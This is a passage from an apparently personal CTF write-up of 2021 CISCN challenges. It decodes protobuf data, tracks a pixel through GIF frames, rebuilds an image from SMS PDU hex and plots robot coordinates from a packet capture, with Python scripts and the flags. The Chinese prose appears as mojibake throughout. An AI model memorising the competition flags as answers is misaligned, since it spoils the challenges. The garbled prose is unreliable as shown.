href="https://www.yuanrenxue.com/app-crawl/parse-protobuf.html">Protobufåè®®é€†å‘è§£æ-APPçˆ¬è™«</a></p><p>å…ˆä¸‹è½½ Protobuf ç¼–è¯‘å™¨å’Œè°ƒç”¨ç¼–è¯‘å™¨çš„æ¥å£ï¼Œè¿™é‡Œç›´æ¥ç”¨ python äº†</p><p><a href="https://github.com/protocolbuffers/protobuf/releases/">https://github.com/protocolbuffers/protobuf/releases/</a></p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/image-20210515143119110.png"></p><p>è§£ç å¾—åˆ°</p><pre class="language-none"><code class="language-none">1: 2002: 151004503 {  1 {    12: 0x35343332  }  2: "7af2c"}3 {  1: "7889b0"  2: "82bc0"}4: 164539585: "d172a38dc"</code></pre><p>å‘ç°å¹¶ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå…ˆç”Ÿæˆ python ä»£ç </p><pre class="language-bash" data-language="bash"><code class="language-bash">protoc.exe test.proto --python_out<span class="token operator">=</span>.</code></pre><p>ç„¶åå†™ä¸ªè„šæœ¬è§£ç </p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> test_pb2r <span class="token operator">=</span> test_pb2<span class="token punctuation">.</span>PBResponse<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'secret1'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    s <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>ParseFromString<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span></code></pre><p>å¾—åˆ°</p><pre class="language-none"><code class="language-none">code: 200flag_part_convert_to_hex_plz: 15100450dataList {  flag_part: "e2345"  junk_data: "7af2c"}dataList {  flag_part: "7889b0"  junk_data: "82bc0"}flag_part_plz_convert_to_hex: 16453958flag_last_part: "d172a38dc"</code></pre><p>æ‹¼æˆ flagï¼Œå…¶ä¸­ <code>junk_data</code> æ˜¯åƒåœ¾æ•°æ®ä¸è¦</p><p><code>CISCN{e66a22e23457889b0fb1146d172a38dc}</code></p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/image-20210515150924012.png"></p><h3 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running_pixel"></a>running_pixel</h3><p>å¼€å±€ä¸€å¼ åŠ¨å›¾</p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/running_pixel.gif" alt="running_pixel"></p><p>ä¸€å…±æœ‰ 382 å¸§ï¼Œé€å¸§æŸ¥çœ‹ï¼Œå¯¼å‡ºæ¯ä¸€å¸§ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> os<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageSequence<span class="token keyword">def</span> <span class="token function">parseGIF</span><span class="token punctuation">(</span>gifname<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># å°†gifè§£æä¸ºå›¾ç‰‡</span>    <span class="token comment"># è¯»å–GIF</span>    im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>gifname<span class="token punctuation">)</span>    <span class="token comment"># GIFå›¾ç‰‡æµçš„è¿­ä»£å™¨</span>    <span class="token builtin">iter</span> <span class="token operator">=</span> ImageSequence<span class="token punctuation">.</span>Iterator<span class="token punctuation">(</span>im<span class="token punctuation">)</span>    <span class="token comment"># è·å–æ–‡ä»¶å</span>    file_name <span class="token operator">=</span> gifname<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    index <span class="token operator">=</span> <span class="token number">1</span>    <span class="token comment"># åˆ¤æ–­ç›®å½•æ˜¯å¦å­˜åœ¨</span>    pic_dirct <span class="token operator">=</span> <span class="token string">"imgs/{0}"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">mkdirlambda</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token keyword">return</span> os<span class="token punctuation">.</span>makedirs<span class="token punctuation">(</span>        x<span class="token punctuation">)</span> <span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>x<span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token boolean">True</span>  <span class="token comment"># ç›®å½•æ˜¯å¦å­˜åœ¨,ä¸å­˜åœ¨åˆ™åˆ›å»º</span>    mkdirlambda<span class="token punctuation">(</span>pic_dirct<span class="token punctuation">)</span>    <span class="token comment"># éå†å›¾ç‰‡æµçš„æ¯ä¸€å¸§</span>    <span class="token keyword">for</span> frame <span class="token keyword">in</span> <span class="token builtin">iter</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"image %d: mode %s, size %s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>index<span class="token punctuation">,</span> frame<span class="token punctuation">.</span>mode<span class="token punctuation">,</span> frame<span class="token punctuation">.</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>        frame<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"imgs/%s/frame%d.png"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>file_name<span class="token punctuation">,</span> index<span class="token punctuation">)</span><span class="token punctuation">)</span>        index <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    parseGIF<span class="token punctuation">(</span><span class="token string">"running_pixel.gif"</span><span class="token punctuation">)</span></code></pre><p>éšæ„çœ‹å‰å‡ å¸§ï¼Œæ”¾å¤§æ¥çœ‹ï¼Œå‘ç°æœ‰ä¸ªåƒç´ ç‚¹åœ¨åŠ¨ã€‚</p><p>æ‰€ä»¥é¢˜ç›®åç§°ä¸­çš„è·‘åŠ¨çš„åƒç´ åº”è¯¥å°±æ˜¯è¿™ä¸ªäº†ã€‚</p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/image-20210525212257022.png"></p><p>æå–å¾—åˆ°è¿™ä¸ªåƒç´ ç‚¹é¢œè‰² RGB ä¸º (233, 233, 233)ï¼Œè€ŒèƒŒæ™¯è‰²æ˜¯ (247, 247, 247)</p><p>å¦å¤–å‘ç°æ¯éš”ä¸€å®šå¸§æ•°ï¼Œè¿™ä¸ªåƒç´ ç‚¹ä¼šæ¶ˆå¤±ï¼Œç„¶ååœ¨å¦ä¸€ä¸ªåœ°æ–¹å‡ºç°ã€‚</p><p>äºæ˜¯å†™ä¸ªè„šæœ¬è·‘æ‰€æœ‰çš„å¸§ï¼ŒæŠŠè¿™ä¸ªåƒç´ ç‚¹çš„è½¨è¿¹ç”»å‡ºæ¥ï¼Œæ¯æ¶ˆå¤±ä¸€æ¬¡ä¿å­˜ä¸€å¼ å›¾ç‰‡ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""MiaoTony"""</span><span class="token keyword">import</span> cv2<span class="token keyword">import</span> os<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token punctuation">,</span> ImageOps<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npim2 <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>last_cnt <span class="token operator">=</span> <span class="token number">0</span><span class="token comment"># list(os.walk('imgs'))[0][2]</span><span class="token keyword">for</span> cnt <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">383</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    img_name <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f'imgs/frame</span><span class="token interpolation"><span class="token punctuation">{</span>cnt<span class="token punctuation">}</span></span><span class="token string">.png'</span></span>    im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>img_name<span class="token punctuation">)</span>    rgb_im <span class="token operator">=</span> im<span class="token punctuation">.</span>convert<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">)</span>    <span class="token comment"># print(rgb_im.size)</span>    <span class="token comment"># (400, 400)</span>    width <span class="token operator">=</span> rgb_im<span class="token punctuation">.</span>width    height <span class="token operator">=</span> rgb_im<span class="token punctuation">.</span>height    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>height<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>width<span class="token punctuation">)</span><span class="token punctuation">:</span>            r<span class="token punctuation">,</span> g<span class="token punctuation">,</span> b <span class="token operator">=</span> rgb_im<span class="token punctuation">.</span>getpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">,</span> g<span class="token punctuation">,</span> b<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">,</span> <span class="token number">233</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token comment"># print('cnt', cnt)</span>                <span class="token comment"># print(i, j)</span>                <span class="token keyword">if</span> cnt <span class="token operator">!=</span> last_cnt <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">:</span>                    <span class="token keyword">print</span><span class="token punctuation">(</span>cnt<span class="token punctuation">)</span>                    im2<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'cnt</span><span class="token interpolation"><span class="token punctuation">{</span>cnt<span class="token punctuation">}</span></span><span class="token string">.png'</span></span><span class="token punctuation">)</span>                im2<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span> i<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>                last_cnt <span class="token operator">=</span> cntim2<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>im2<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'final.png'</span><span class="token punctuation">)</span></code></pre><p>æœ€åçš„å›¾æ˜¯è¿™æ ·çš„ã€‚</p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/final.png"></p><p>æ‰‹åŠ¨æŒ‰é¡ºåºæŠŠå‡ºæ¥çš„å›¾ç‰‡å„ä¸ªå­—æ¯æå–å‡ºæ¥ã€‚</p><p>ï¼ˆå…¶å®æ›´å¥½çš„æ€è·¯æ˜¯æ¯æ¬¡åƒç´ ç‚¹æ¶ˆå¤±çš„æ—¶å€™æ–°å»ºä¸€å¼ å›¾çš„â€¦â€¦çœ‹çš„è¦çœ¼çäº†</p><p>å‡ºæ¥æ˜¯ä¸ª UUID çš„æ ¼å¼ã€‚</p><pre class="language-none"><code class="language-none">12504D0F-9DE1-4B00-87A5-A5FDD0986A00</code></pre><p>è£¹ä¸Š CISCNï¼Œç„¶åå‘ç° 19:00ï¼Œè‰ï¼Œäº¤ä¸ä¸Šå»äº†ï¼</p><p>å¿ƒæ€ç‚¸äº†ï¼ï¼ï¼</p><p>ï¼ˆåæ¥çœ‹å¤§ä½¬ wp è¯´è¿™é‡Œè¿˜è¦è½¬æˆå°å†™å†äº¤ä¸Šå»</p><p><code>CISCN{12504d0f-9de1-4b00-87a5-a5fdd0986a00}</code></p><h2 id="ç¬¬äºŒé˜¶æ®µ"><a href="#ç¬¬äºŒé˜¶æ®µ" class="headerlink" title="ç¬¬äºŒé˜¶æ®µ"></a>ç¬¬äºŒé˜¶æ®µ</h2><h3 id="éš”ç©ºä¼ è¯"><a href="#éš”ç©ºä¼ è¯" class="headerlink" title="éš”ç©ºä¼ è¯"></a>éš”ç©ºä¼ è¯</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šAlice å’Œ Bob è¿›è¡Œéš”ç©ºä¼ è¯çš„æ—¶å€™è¢«æˆ‘â€œå·å¬â€åˆ°äº†ï¼Œä½ èƒ½å¸®æˆ‘åˆ†æåˆ†æä»–ä»¬åœ¨äº¤æµä»€ä¹ˆå—ï¼Ÿ<br>æ³¨æ„ï¼šflagå½¢å¼ï¼šCISCN{XXXXX}</p></blockquote><p>ä½ ä»¬åˆåœ¨åŠ å¯†é€šä¿¡ï¼ï¼ï¼</p><p>ï¼ˆè¿™é¢˜å¤ç°çš„ï¼Œç„¶è€Œè¿‡å»æœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œå½“æ—¶æ‰¾çš„èµ„æ–™å¿˜è®°è®°å½•äº†ï¼Œ<del>ç°åœ¨åˆæ‡’å¾—å†æ‰¾äº†ï¼Œå°±ä½›ç³»å†™ä¸€å†™8</del></p><p>ï¼ˆè¿˜æ˜¯å»æ‰¾äº†ä¸‹èµ„æ–™ å”‰</p><p>å¼€å±€ç»™äº†ä¸€å †æ ¼å¼ç±»ä¼¼çš„æ•°æ®ã€‚</p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/image-20210525222938369.png"></p><p>æŸ¥äº†ä¸€ä¸‹å‘ç°æ˜¯ SMS çŸ­ä¿¡é‡Œç”¨çš„ PDU ç¼–ç ã€‚</p><blockquote><p><a href="https://mirokaku.github.io/Blog/2017/PDU-Encode/">PDU ç¼–ç è§„åˆ™</a></p><p>è¿˜æ‰¾åˆ°äº† åœ¨çº¿ PDU æ ¼å¼ç¼–ç /è§£ç çš„ç½‘ç«™</p><p><a href="https://tool.letmetellyou.xyz/pdu/">https://tool.letmetellyou.xyz/pdu/</a> æˆ–è€… <a href="http://www.sendsms.cn/pdu/">http://www.sendsms.cn/pdu/</a></p><p>åœ¨ pypi æ‰¾åˆ°äº†ä¸€ä¸ª python çš„ moduleï¼š <a href="https://pypi.org/project/smspdu/">smspdu</a> </p></blockquote><p>æ‰‹åŠ¨è§£ç å‰å‡ æ¡</p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/image-20210525224211606.png"></p><p>å‘ç°æ˜¯</p><pre class="language-none"><code class="language-none">hello,bob!what is the flag?the first part of the flag is the first 8 digits of your phone numberé‚£å…¶ä»–éƒ¨åˆ†å‘¢çœ‹çœ‹ä½ èƒ½ä»è¿™äº›æ•°æ®é‡Œå‘ç°ä»€ä¹ˆï¼Ÿw4655b4c4ce7b6d5edd6d5cb961fca84f193ca71471db155b62c9df5ea1ebed933929de07bebcdb7853ddaf6303ac6fbaaa0fff6bb23cbfefbecd716028173e1259796fbeebf3f12f43ea54fcfeee54f11c8f5a91d7cb54fd0b83e927bbfbe7d6a121d32649748f453ca0fbffe56162c5e5c4e3f757804e9aeb17a8b441513c78591c43c9493bb2567c6a475e69c59912c9e2f0785fe43761a523efa7c7479effdbf...</code></pre><p>flag çš„ç¬¬ä¸€éƒ¨åˆ†æ˜¯å·ç çš„å‰8ä½ï¼Œ+8615030442000ï¼Œé‚£å°±æ˜¯ <code>15030442</code>ã€‚</p><p>ä¹‹åå°±ä¸€å † hex ç¼–ç ã€‚</p><p>å†™ä¸ªè„šæœ¬æå–å¹¶å¯¼å‡ºåˆ°æ–‡ä»¶ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> smspdu<span class="token punctuation">.</span>codecs <span class="token keyword">import</span> GSM<span class="token punctuation">,</span> UCS2<span class="token keyword">from</span> smspdu<span class="token punctuation">.</span>easy <span class="token keyword">import</span> easy_sms<span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify<span class="token comment"># x = easy_sms('04910180F6040D91685130402400F0000012405291443408A0E65A381723DFC6E21ACD4C868971B3724E76138BCDE2F28D6C0BC76431F24C66A3E56E349C99569B8DC330B3D86C2ED76C319B6C5C2BD7C6B4F2CC7CABDD70305A39172E8B63B7304E4CA3C56AB1D9F886ABE56263DA6C9CA3E56662B1AC66BB8D6D61DAAD56B6E5C6B55C2E261BE7CA3233EC86AB99CBB4D9CD160BD764B3B2397C1BDF68B75CD96C268BCD')</span><span class="token comment"># print(x)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    s <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>l <span class="token operator">=</span> s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>l1 <span class="token operator">=</span> l<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>x <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> l1<span class="token punctuation">:</span>    tmp <span class="token operator">=</span> easy_sms<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span>    x <span class="token operator">+=</span> tmp<span class="token keyword">print</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token comment"># x.encode()</span>y <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'decode.dat'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fout<span class="token punctuation">:</span>    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>y<span class="token punctuation">)</span></code></pre><p>binwalk ä¸€ä¸‹å‘ç°æœ‰å¼  png å›¾ç‰‡ï¼Œæå–å‡ºæ¥ã€‚</p><p>ç„¶è€Œå‘ç°æ‰“ä¸å¼€â€¦â€¦</p><p>ç„¶åæ¯”èµ›çš„æ—¶å€™è¯•äº†ç”¨ PCRT æ¥ä¿®å¤ï¼Œä½†æ²¡æˆåŠŸã€‚ç½‘ä¸Šæ‰¾äº†ä¸ªå·¥å…·ç„¶åè¦æ”¶é’±ï¼Œæ°”æ­»å–µå–µäº†ï¼ï¼ï¼</p><p>åæ¥å‘ç°éœ€è¦æŒ‰ç…§æ—¶é—´é¡ºåºæ’åºã€‚</p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/image-20210525232953543.png"></p><p>å”‰å¥½çƒ¦ï¼ˆ</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""MiaoTony"""</span><span class="token keyword">from</span> smspdu<span class="token punctuation">.</span>codecs <span class="token keyword">import</span> GSM<span class="token punctuation">,</span> UCS2<span class="token keyword">from</span> smspdu<span class="token punctuation">.</span>easy <span class="token keyword">import</span> easy_sms<span class="token keyword">from</span> binascii <span class="token keyword">import</span> unhexlify<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.txt'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    s <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>l <span class="token operator">=</span> s<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span>l1 <span class="token operator">=</span> l<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>x <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ts <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> l1<span class="token punctuation">:</span>    tmp <span class="token operator">=</span> easy_sms<span class="token punctuation">(</span>i<span class="token punctuation">)</span>    content <span class="token operator">=</span> tmp<span class="token punctuation">[</span><span class="token string">'content'</span><span class="token punctuation">]</span>    t <span class="token operator">=</span> tmp<span class="token punctuation">[</span><span class="token string">'date'</span><span class="token punctuation">]</span>    x<span class="token punctuation">.</span>append<span class="token punctuation">(</span>content<span class="token punctuation">)</span>    ts<span class="token punctuation">.</span>append<span class="token punctuation">(</span>t<span class="token punctuation">)</span>l2 <span class="token operator">=</span> <span class="token builtin">sorted</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span> ts<span class="token punctuation">)</span><span class="token punctuation">,</span> key<span class="token operator">=</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>l3 <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">zip</span><span class="token punctuation">(</span><span class="token operator">*</span>l2<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>info <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>l3<span class="token punctuation">)</span><span class="token comment"># type(info)</span><span class="token comment"># str</span>y <span class="token operator">=</span> unhexlify<span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'decode2.dat'</span><span class="token punctuation">,</span> <span class="token string">'wb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fout<span class="token punctuation">:</span>    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span>y<span class="token punctuation">)</span></code></pre><p>å¾—åˆ°ä¸€å¼ å›¾ï¼Œç»ˆäºèƒ½æ‰“å¼€äº†ï¼Œè€Œä¸”æ•´ä¸ªæ•°æ®å°±æ˜¯ä¸€æ•´å¼ å›¾ç‰‡ã€‚ç„¶è€Œè¿˜æ˜¯æ²¡æ€è·¯ã€‚</p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/image-20210526000029763.png"></p><p>çœ‹äº†å¤§ä½¬ä»¬çš„ wp æ‰å‘ç°ï¼Œ<code>w465</code> æ˜¯å®½åº¦ä¸º 465 çš„æ„æ€â€¦â€¦è‰ï¼</p><p>æ”¹äº†ä¹‹åå¾—åˆ°</p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/00000000.png"></p><p>äºæ˜¯ flag å°±æ˜¯</p><p><code>CISCN{15030442_b586_4c9e_b436_26def12293e4}</code></p><h2 id="ç¬¬ä¸‰é˜¶æ®µ"><a href="#ç¬¬ä¸‰é˜¶æ®µ" class="headerlink" title="ç¬¬ä¸‰é˜¶æ®µ"></a>ç¬¬ä¸‰é˜¶æ®µ</h2><h3 id="robot"><a href="#robot" class="headerlink" title="robot"></a>robot</h3><blockquote><p>é¢˜ç›®æè¿°ï¼šåˆ†æç»™å‡ºçš„æœºå™¨äººä»¿çœŸç¨‹åºå’Œæµé‡åŒ…ï¼Œæå–æœºå™¨äººæ§åˆ¶ç¨‹åºæ§åˆ¶æœºå™¨äººå†™å‡ºçš„å­—ç¬¦ä¸²ï¼Œflagä¸ºâ€CISCN{md5(æœºå™¨äººç»˜åˆ¶çš„å­—ç¬¦ä¸²)}â€ï¼ˆmd5å€¼å°å†™ï¼‰</p></blockquote><p><code>Robot.rspag</code> æ˜¯ RobotStudio æ–‡ä»¶ï¼Œ<code>cap.pcapng</code> æ˜¯ç½‘ç»œæµé‡æŠ“åŒ…ï¼Œ<code>Control</code> ç›®å½•ä¸‹æ˜¯ä¸€ä¸ªå›¾å½¢åŒ–çš„åŸºäº C# å†™çš„ä¸€ä¸ªå›¾å½¢åŒ–ä¸Šä½æœºï¼Œä»¥åŠå¯¹åº”çš„ dll æ–‡ä»¶ã€‚</p><p>ç”¨ ILSPY åæ±‡ç¼– exeï¼Œå‘ç°å…¶å®éƒ½æ˜¯è°ƒç”¨åº•å±‚ dll æä¾›çš„ SDK æ¥å£ï¼Œå¹¶æ²¡æœ‰è‡ªå·±å»å®ç°ç½‘ç»œé€šä¿¡ç›¸å…³çš„åŠŸèƒ½ã€‚</p><p>å‚è€ƒç›¸å…³çš„èµ„æ–™ä¹Ÿæ˜¯å¦‚æ­¤ã€‚</p><p><a href="https://blog.csdn.net/weixin_39090239/article/details/81275759">https://blog.csdn.net/weixin_39090239/article/details/81275759</a></p><p><a href="https://blog.csdn.net/weixin_42837024/article/details/100542204">https://blog.csdn.net/weixin_42837024/article/details/100542204</a></p><p><a href="https://zhuanlan.zhihu.com/p/62390089?ivk_sa=1024320u">https://zhuanlan.zhihu.com/p/62390089?ivk_sa=1024320u</a></p><p><a href="https://developercenter.robotstudio.com/">https://developercenter.robotstudio.com/</a></p><p>ä¹‹ååœ¨æµé‡é‡Œå‘ç°æœ‰ä¸€ç³»åˆ—è®¾ç½®åæ ‡çš„ï¼Œç›²çŒœè¿™ä¸ªå°±æ˜¯æœºå™¨äººç”»çš„ä¸œè¥¿äº†ã€‚</p><p><img src="/2021/05/25/CTF_2021CISCN_preliminary/image-20210516024416682.png"></p><p>äºæ˜¯å†™ä¸ªè„šæœ¬æå–ä¸€ä¸‹ï¼Œç”»å¼ å›¾ã€‚</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token triple-quoted-string string">"""MiaoTony"""</span><span class="token keyword">import</span> re<span class="token keyword">import</span> cv2<span class="token keyword">import</span> os<span class="token keyword">from</span> PIL <span class="token keyword">import</span> Image<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npim <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">'RGB'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">,</span> <span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">)</span>width <span class="token operator">=</span> im<span class="token punctuation">.</span>widthheight <span class="token operator">=</span> im<span class="token punctuation">.</span>height<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'test.dat'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fin<span class="token punctuation">:</span>    s <span class="token operator">=</span> fin<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>re_pos <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span><span class="token string">r'tgPos{(\d+)}\.Value\.(\[\d+,\d+,\d+\])'</span><span class="token punctuation">)</span>l <span class="token operator">=</span> re_pos<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>s<span class="token punctuation">,</span> re<span class="token punctuation">.</span>M<span class="token punctuation">)</span><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'data.dat'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> fout<span class="token punctuation">:</span>    fout<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span><span class="token punctuation">)</span>points <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">eval</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token keyword">for</span> x <span class="token keyword">in</span> l<span class="token punctuation">]</span><span class="token comment"># l = [[27, 36, 0], [28, 35, 0], [29, 35, 0], [31, 35, 0], [32, 35, 0], [33, 35, 0], [35, 35, 0],</span><span class="token comment">#      [36, 35, 0], [37, 35, 0], [39, 34, 0]]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> points<span class="token punctuation">:</span>    im<span class="token punctuation">.</span>putpixel<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">,</span> <span class="token number">255</span><span class="token punctuation">)</span><span class="token punctuation">)</span>im<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span>im<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">'info.png'</span><span class="token punctuation">)</span><span class="token comment"># 